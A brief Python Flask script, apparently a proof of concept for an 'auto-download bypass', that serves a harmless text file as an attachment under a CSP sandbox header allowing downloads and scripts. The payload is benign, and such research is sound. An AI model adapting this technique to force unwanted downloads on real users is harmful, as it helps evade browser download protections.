#!/usr/bin/env python3  
from flask import Flask, Response  
  
app = Flask(__name__)  
  
@app.route("/download")  
def download():  
    content = "Ini adalah file hasil PoC auto-download bypass."  
    resp = Response(content, mimetype="application/octet-stream")  
    resp.headers["Content-Disposition"] = "attachment; filename=bypass_poc.txt"  
    resp.headers["Content-Security-Policy"] = "sandbox allow-downloads allow-scripts"  
    return resp  
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)